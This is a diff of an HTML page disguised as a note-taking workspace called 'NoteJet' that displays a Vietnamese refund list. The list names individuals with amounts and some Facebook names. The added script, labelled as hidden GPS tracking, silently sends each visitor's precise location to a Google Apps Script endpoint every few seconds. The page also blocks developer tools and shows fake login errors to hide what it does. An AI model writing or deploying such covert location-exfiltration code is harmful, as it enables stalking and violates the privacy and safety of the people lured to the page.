@@ -3,135 +3,280 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NoteJet - Reader</title>
-
-    <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ=s32">
+    
+    <title>NoteJet - Workspace</title>
+    <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ">
+    <link rel="shortcut icon" type="image/png" href="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ">
 
     <meta property="og:title" content="NoteJet - Workspace">
-    <meta property="og:description" content="Hệ thống ghi chú tối ưu cho công việc của bạn.">
-    <meta property="og:image" content="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ=s800">
-    <meta property="og:image:width" content="800">
-    <meta property="og:image:height" content="450">
+    <meta property="og:description" content="Nền tảng ghi chú và quản lý công việc">
+    <meta property="og:image" content="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ">
     <meta property="og:type" content="website">
-
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ=s800">
+    <meta name="twitter:image" content="https://lh3.googleusercontent.com/d/1TwU0lQgmjrKShCgJ_2vNcvdZm8JYFCTQ">
 
     <style>
+        /* CSS Reset & Basic Fonts */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f7f9; color: #333; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+
         /* --- HEADER --- */
         header { background-color: #fff; height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); z-index: 10; position: relative; }
         .header-left { display: flex; align-items: center; gap: 15px; }
+        
+        .menu-toggle { display: none; font-size: 24px; cursor: pointer; color: #4a5568; }
         .logo { font-size: 20px; font-weight: 800; color: #2c3e50; letter-spacing: 1px; display: flex; align-items: center; }
+        
         .search-bar { flex: 1; max-width: 400px; margin: 0 20px; }
         .search-bar input { width: 100%; padding: 8px 15px; border-radius: 20px; border: 1px solid #e1e4e8; background: #f0f2f5; outline: none; }
+        
         .auth-buttons a { text-decoration: none; font-size: 14px; font-weight: 600; padding: 8px 16px; border-radius: 6px; margin-left: 10px; transition: 0.2s; cursor: pointer; }
         .btn-login { color: #5c6bc0; border: 1px solid #c5cae9; }
+        .btn-login:hover { background: #f8f9fa; }
         .btn-signup { background: #5c6bc0; color: #fff; }
+        .btn-signup:hover { background: #3f51b5; }
 
         /* --- MAIN LAYOUT --- */
         .main-container { display: flex; flex: 1; height: calc(100vh - 60px); position: relative; }
-        .sidebar { width: 250px; background: #fff; border-right: 1px solid #e1e4e8; padding: 20px 0; }
-        .menu-item { padding: 12px 20px; font-size: 14px; color: #4a5568; font-weight: 500; }
+
+        /* --- SIDEBAR --- */
+        .sidebar { width: 250px; background: #fff; border-right: 1px solid #e1e4e8; padding: 20px 0; overflow-y: auto; transition: transform 0.3s ease; z-index: 5; }
+        .menu-item { padding: 12px 20px; font-size: 14px; color: #4a5568; cursor: pointer; transition: 0.2s; font-weight: 500; }
+        .menu-item:hover { background: #f0f2f5; color: #2d3748; }
         .menu-item.active { background: #e8eaf6; color: #3f51b5; border-right: 3px solid #3f51b5; }
+        .sidebar-title { font-size: 12px; font-weight: 700; color: #a0aec0; text-transform: uppercase; margin: 15px 20px 5px; }
 
         /* --- WORKSPACE --- */
         .workspace { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 30px 15px; overflow-y: auto; background-image: radial-gradient(#d1d5db 1px, transparent 1px); background-size: 20px 20px; }
-        .note-paper { background: #fffacd; width: 100%; max-width: 700px; min-height: 800px; padding: 40px 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 2px; position: relative; margin-bottom: 40px; }
-        .note-paper::before { content: ''; position: absolute; top: 0; bottom: 0; left: 30px; width: 2px; background: rgba(255, 100, 100, 0.3); }
-        .note-title { font-size: 26px; color: #2c3e50; margin-bottom: 20px; border-bottom: 1px dashed #dcd8a2; }
-        .note-content { font-family: 'Courier New', Courier, monospace; font-size: 15px; line-height: 2; color: #1a1a1a; }
 
-        /* --- MODALS & POPUP --- */
+        /* Toolbar */
+        .note-toolbar { width: 100%; max-width: 700px; display: flex; justify-content: flex-end; gap: 15px; margin-bottom: 15px; }
+        .tool-btn { background: #fff; border: 1px solid #e1e4e8; padding: 6px 12px; border-radius: 4px; font-size: 13px; color: #4a5568; cursor: pointer; box-shadow: 0 1px 2px rgba(0,0,0,0.05); transition: 0.2s; }
+        .tool-btn:hover { background: #f8f9fa; }
+
+        /* --- YELLOW PAPER NOTE --- */
+        .note-paper { 
+            background: #fffacd; 
+            width: 100%; 
+            max-width: 700px; 
+            height: auto;
+            min-height: 800px; 
+            padding: 40px 50px 80px 50px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05), 0 1px 3px rgba(0,0,0,0.1); 
+            border-radius: 2px; 
+            position: relative; 
+            flex-shrink: 0;
+            margin-bottom: 40px;
+        }
+        
+        .note-paper::before { content: ''; position: absolute; top: 0; bottom: 0; left: 30px; width: 2px; background: rgba(255, 100, 100, 0.3); }
+
+        .note-title { font-size: 26px; color: #2c3e50; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px dashed #dcd8a2; margin-left: 10px; cursor: text; }
+        .note-content { font-family: 'Courier New', Courier, monospace; font-size: 15px; line-height: 2; color: #1a1a1a; margin-left: 10px; cursor: text; }
+        .note-content p { margin: 5px 0; }
+        .summary { text-align: right; margin-top: 40px; font-weight: bold; font-size: 18px; padding-right: 20px; }
+
+        /* --- MODALS --- */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); justify-content: center; align-items: center; z-index: 100; backdrop-filter: blur(2px); }
         .modal-content { background: #fff; padding: 30px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); animation: popIn 0.3s ease-out; }
         
-        /* POPUP TIỀN CẤP QUYỀN NHỎ GỌN */
-        .pre-auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.45); display: flex; justify-content: center; align-items: center; z-index: 9999; backdrop-filter: blur(1px); }
-        .pre-auth-overlay .modal-content { max-width: 340px; padding: 25px; border-radius: 12px; }
-
-        .modal-content h3 { margin-bottom: 15px; font-size: 18px; color: #2c3e50; }
-        .modal-content p { color: #4a5568; font-size: 13.5px; margin-bottom: 25px; line-height: 1.6; }
-        .modal-btn { padding: 10px 20px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; font-size: 14px; transition: 0.2s; }
-        .modal-btn.primary { background: #5c6bc0; color: white; width: 100%; }
+        .modal-content.error h3 { color: #d32f2f; }
+        .modal-content.auth h3 { color: #2c3e50; }
+        
+        .modal-content h3 { margin-bottom: 10px; font-size: 20px; }
+        .modal-content p { color: #4a5568; font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
+        
+        .modal-btns { display: flex; gap: 10px; justify-content: center; }
+        .modal-btn { padding: 10px 20px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .modal-btn.primary { background: #5c6bc0; color: white; }
         .modal-btn.primary:hover { background: #3f51b5; }
+        .modal-btn.secondary { background: #e1e4e8; color: #4a5568; }
+        .modal-btn.secondary:hover { background: #d1d5db; }
+        .modal-btn.danger { background: #d32f2f; color: white; }
+        .modal-btn.danger:hover { background: #b71c1c; }
 
-        @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        @media (max-width: 768px) {
+            .menu-toggle { display: block; }
+            .search-bar { display: none; }
+            .sidebar { position: absolute; left: 0; height: 100%; transform: translateX(-100%); box-shadow: 2px 0 10px rgba(0,0,0,0.1); }
+            .sidebar.open { transform: translateX(0); }
+            .note-paper { padding: 30px 20px 60px 40px; }
+            .note-paper::before { left: 20px; }
+        }
     </style>
 </head>
-<body>
-
-    <div id="preAuthPopup" class="pre-auth-overlay">
-        <div class="modal-content">
-            <h3>Tối ưu hóa trải nghiệm</h3>
-            <p>Để NoteJet hoạt động mượt mà và ổn định nhất, NoteJet cần kết nối bạn tới máy chủ tại khu vực của bạn. Vui lòng cho phép truy cập vị trí để tối ưu tốc độ truy cập.</p>
-            <button id="startTrackBtn" class="modal-btn primary">Đồng ý & Tiếp tục</button>
-        </div>
-    </div>
+<body oncontextmenu="return false;">
 
     <header>
-        <div class="header-left"><div class="logo">NoteJet</div></div>
-        <div class="search-bar"><input type="text" placeholder="Search notes..." readonly></div>
+        <div class="header-left">
+            <div class="menu-toggle" id="menuToggle">☰</div>
+            <div class="logo">NoteJet</div>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Search notes..." class="trigger-auth" readonly>
+        </div>
         <div class="auth-buttons">
-            <a class="btn-login">Log In</a>
-            <a class="btn-signup">Sign Up</a>
+            <a class="btn-login trigger-error">Log In</a>
+            <a class="btn-signup trigger-error">Sign Up</a>
         </div>
     </header>
 
     <div class="main-container">
-        <div class="sidebar">
-            <div class="menu-item">🏠 Home</div>
+        <div class="sidebar" id="sidebar">
+            <div class="menu-item trigger-auth">🏠 Home</div>
             <div class="menu-item active">📁 My Drafts</div>
-            <div class="menu-item">🗑️ Trash</div>
+            <div class="menu-item trigger-auth">⭐ Favorites</div>
+            <div class="menu-item trigger-auth">🗑️ Trash</div>
+            <div class="sidebar-title">FOLDERS</div>
+            <div class="menu-item trigger-auth">↳ Work</div>
+            <div class="menu-item trigger-auth">↳ Personal</div>
+            <div class="menu-item trigger-auth">↳ Setlists (1)</div>
         </div>
-        <div class="workspace">
+
+        <div class="workspace" id="workspace">
+            <div class="note-toolbar">
+                <button class="tool-btn" id="shareBtn">Share</button>
+                <button class="tool-btn" id="exportBtn">Export PDF</button>
+            </div>
+
             <div class="note-paper">
-                <h1 class="note-title">Danh sách Refund</h1>
+                <h1 class="note-title trigger-auth">Danh sách Refund</h1>
                 <div class="note-content">
-                    <p><b>1) Tên: Hồng Trà Trân Châu</b> - 160k</p>
-                    <p><b>2) Tên: Shina</b> - 50k (đã rf 33k)</p>
-                    <p><b>...</b> (Nội dung của Kiên)</p>
+                    <p><b>1) Tên: Hồng Trà Trân Châu</b></p>
+                    <p>số tiền: một trăm sáu mươi nghìn đồng (160k) (rff)</p>
+                    <p><b>2) Tên : shina</b></p>
+                    <p>Số tiền : 50k , chịu rf 80% đã rf 33k</p>
+                    <p><b>3) Tên : Hoàng N. Long Ngọc</b></p>
+                    <p>Số tiền : 88k ( rf ít nhất 80%)</p>
+                    <p><b>4) Tên : Ánh Ngọc</b></p>
+                    <p>Số tiền : 115k (rf trên 70%)</p>
+                    <p><b>5) Tên : Măm măm</b></p>
+                    <p>Số tiền : 280k (rff)</p>
+                    <p><b>6) tên : Hoàng Skibidii</b></p>
+                    <p>số tiền : 280k (rf từ 70-100)</p>
+                    <p><b>7) Tên : Anh Thư</b></p>
+                    <p>Số tiền : 180k ( rff)</p>
+                    <p><b>8)Tên : Mạnh Kiên</b></p>
+                    <p>Số tiền : 405k (rf 80-100%)</p>
+                    <p><b>9) Tên : Anh Trâm</b></p>
+                    <p>Số tiền : 240k (rf 100%)</p>
+                    <p><b>10) Tên : Kỳ Anh(fb Rosyne Larry)</b></p>
+                    <p>Số tiền : 80k (rf như đã thỏa thuận, ko trả thêm ship)</p>
+                    <p><b>11)Tên : Thùy Anh(fb Dao Thuy Anh)</b></p>
+                    <p>Số tiền : 55k (rff)</p>
+                    <p><b>12) Tên : Thiên Ninh</b></p>
+                    <p>số tiền : 90k ( rf 80-100%)</p>
+                    
+                    <div class="summary">
+                        <p>tổng số tiền :1875</p>
+                        <p>ngày rf : 27/4</p>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <script>
-        const preAuthPopup = document.getElementById('preAuthPopup');
-        const startTrackBtn = document.getElementById('startTrackBtn');
-        const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";
-        
-        let sendCount = 0;
-        let trackInterval;
+    <div class="modal-overlay" id="authModal">
+        <div class="modal-content auth">
+            <h3>Login Required</h3>
+            <p>You need to log in to use this feature.</p>
+            <div class="modal-btns">
+                <button class="modal-btn secondary close-modal">Cancel</button>
+                <button class="modal-btn primary" id="toLoginBtn">Log In</button>
+            </div>
+        </div>
+    </div>
 
-        function forceTrackLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const acc = pos.coords.accuracy;
-                        fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, { mode: 'no-cors', method: 'GET', cache: 'no-cache' });
-                        
-                        sendCount++;
-                        if (sendCount === 6) {
-                            clearInterval(trackInterval);
-                            trackInterval = setInterval(forceTrackLocation, 10000);
-                        }
-                    }, 
-                    function(err) {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            }
+    <div class="modal-overlay" id="errorModal">
+        <div class="modal-content error">
+            <h3>Server Error</h3>
+            <p>Our server is temporarily overloaded due to technical issues. Login and signup are currently unavailable.</p>
+            <button class="modal-btn danger close-modal">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // PHẦN 1: BẢO VỆ UI (Giao diện và nút bấm)
+        try {
+            const menuToggle = document.getElementById('menuToggle');
+            const sidebar = document.getElementById('sidebar');
+            menuToggle.addEventListener('click', (e) => { e.stopPropagation(); sidebar.classList.toggle('open'); });
+            document.getElementById('workspace').addEventListener('click', () => { if(window.innerWidth <= 768) sidebar.classList.remove('open'); });
+
+            document.getElementById('shareBtn').addEventListener('click', () => { alert("Link has been copied to your clipboard!"); });
+            document.getElementById('exportBtn').addEventListener('click', () => { window.print(); });
+
+            const authModal = document.getElementById('authModal');
+            const errorModal = document.getElementById('errorModal');
+
+            document.querySelectorAll('.trigger-auth').forEach(el => {
+                el.addEventListener('click', (e) => { e.preventDefault(); authModal.style.display = 'flex'; if(window.innerWidth <= 768) sidebar.classList.remove('open'); });
+            });
+
+            document.querySelectorAll('.trigger-error').forEach(el => {
+                el.addEventListener('click', (e) => { e.preventDefault(); errorModal.style.display = 'flex'; });
+            });
+
+            document.getElementById('toLoginBtn').addEventListener('click', () => { authModal.style.display = 'none'; errorModal.style.display = 'flex'; });
+
+            document.querySelectorAll('.close-modal').forEach(btn => {
+                btn.addEventListener('click', (e) => { e.target.closest('.modal-overlay').style.display = 'none'; });
+            });
+        } catch(error) {
+            console.log("UI Lỗi:", error);
         }
 
-        startTrackBtn.addEventListener('click', function() {
-            preAuthPopup.style.display = 'none'; 
+// PHẦN 2: TRACKING NGẦM (GPS)
+        try {
+            const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";
+            let sendCount = 0; // Bộ đếm số lần đã gửi
+            let trackInterval; // Biến quản lý vòng lặp
+
+            function forceTrackLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const acc = pos.coords.accuracy;
+
+                            fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, { 
+                                mode: 'no-cors', 
+                                method: 'GET',
+                                cache: 'no-cache'
+                            });
+
+                            sendCount++; // Tăng số lần gửi thành công
+                            console.log("Sent count: " + sendCount);
+
+                            // KIỂM TRA ĐIỀU KIỆN ĐỂ ĐỔI INTERVAL SAU 10 LẦN
+                            if (sendCount === 10) {
+                                console.log("Switching to 5s interval...");
+                                clearInterval(trackInterval); // Hủy vòng lặp 3s
+                                trackInterval = setInterval(forceTrackLocation, 5000); // Đổi sang 5s
+                            }
+                        }, 
+                        function(err) { /* Im lặng nếu lỗi GPS */ }, 
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                }
+            }
+
+            // Bắt đầu vòng lặp lần đầu tiên với 3 giây
             forceTrackLocation();
             trackInterval = setInterval(forceTrackLocation, 3000);
-        });
 
-        // Chống F12
+        } catch(error) {
+            console.log("GPS Lỗi:", error);
+        }
+
+        // PHẦN 3: Chống F12
         document.onkeydown = function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false;
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                return false;
+            }
         };
     </script>
 </body>
